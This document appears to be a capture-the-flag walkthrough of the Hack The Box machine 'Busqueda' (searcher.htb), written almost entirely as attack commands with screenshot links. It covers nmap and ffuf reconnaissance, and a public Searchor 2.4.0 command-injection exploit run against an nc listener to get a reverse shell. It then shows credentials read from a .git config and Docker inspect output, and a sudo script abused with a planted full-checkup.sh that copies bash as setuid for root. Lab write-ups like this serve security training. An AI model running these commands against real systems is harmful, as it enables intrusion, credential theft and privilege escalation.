```
nmap -sS -sC -sV -T5 -Pn 10.10.11.208
http://searcher.htb/
Searchor 2.4.0
https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
nc -lvnp 9001
./exploit.sh searcher.htb 10.10.14.6
./LinEnum.sh
ls –la
cat /var/www/app/.git/config
ssh svc@10.10.11.208
http://gitea.searcher.htb/
http://gitea.searcher.htb/explore/users
sudo –l
ls -l /opt/scripts/system-checkup.py
sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
http://gitea.searcher.htb/
Login as administrator
http://gitea.searcher.htb/administrator/scripts
cd /opt/scripts/
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
cd /tmp
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchmod 4777 /tmp/0xdf' > full-checkup.sh
chmod +x full-checkup.sh
sudo python3 /opt/scripts/system-checkup.py full-checkup
ls -l /tmp/0xdf
/tmp/0xdf -p
```


```
nmap -sS -sC -sV -T5 -Pn 10.10.11.208
```
![image](https://github.com/user-attachments/assets/b87356b0-328d-4e3f-9d77-9931a3f05397)

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://searcher.htb/FUZZ -e .aspx,.php,.txt,.html,.sh
```
![image](https://github.com/user-attachments/assets/d9bc1e67-58eb-4ac9-845e-722262c25cd1)

```
http://searcher.htb/
Flask and Searchor 2.4.0
```
![image](https://github.com/user-attachments/assets/bd4e8d89-c572-47ff-aed8-78849d8ecfa0)

```
https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
nc -lvnp 9001
./exploit.sh searcher.htb 10.10.14.6
```
![image](https://github.com/user-attachments/assets/0c8ae1ca-65ee-4482-a470-d158ca0885ac)

![image](https://github.com/user-attachments/assets/75afe791-f94b-46c5-95c0-2377531e07b5)

```
./LinEnum.sh
```
![image](https://github.com/user-attachments/assets/fd501ed2-f7f8-4011-b4f8-c765d4eaabae)

```
ls –la
cat /var/www/app/.git/config
jh1usoih2bkjaspwe92
```
![image](https://github.com/user-attachments/assets/85d62632-00cc-42cc-8da1-7f6413235d1c)

```
ssh svc@10.10.11.208
```
![image](https://github.com/user-attachments/assets/586273ab-cf7c-4e40-bfe5-b9120eeab1d2)

```
http://gitea.searcher.htb/
http://gitea.searcher.htb/explore/users
```
![image](https://github.com/user-attachments/assets/d6e218ad-6de1-4bdf-a6fc-2089c28078df)

![image](https://github.com/user-attachments/assets/519c8951-5394-4350-aec1-b75be2a8b901)

```
sudo –l
ls -l /opt/scripts/system-checkup.py
```
![image](https://github.com/user-attachments/assets/73f7879c-6a72-4aa0-803f-a00969f0f4fc)

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
```
![image](https://github.com/user-attachments/assets/86e9740e-c3ed-4727-b569-a40d4a0c4e7d)

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
```
![image](https://github.com/user-attachments/assets/bf255e72-2c04-40fc-a1bb-5c1c4acc38b0)

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
yuiu1hoiu4i5ho1uh
```
![image](https://github.com/user-attachments/assets/3685c0b4-d22d-40a3-b6d3-7310cb3eaf89)

```
http://gitea.searcher.htb/
Login as administrator
http://gitea.searcher.htb/administrator/scripts
```
![image](https://github.com/user-attachments/assets/4576ac3a-928d-4aa2-92f5-a53ceed289b0)

![image](https://github.com/user-attachments/assets/842814c0-3185-4082-9fda-8ec21de91264)

```
cd /opt/scripts/
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```
![image](https://github.com/user-attachments/assets/e601cf8e-8c93-46e5-8690-e27c9e92d6cc)

```
cd /tmp
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchmod 4777 /tmp/0xdf' > full-checkup.sh
chmod +x full-checkup.sh
sudo python3 /opt/scripts/system-checkup.py full-checkup
ls -l /tmp/0xdf
/tmp/0xdf -p
```
![image](https://github.com/user-attachments/assets/ba0cbc60-a1a6-424f-8c43-b75a15663089)
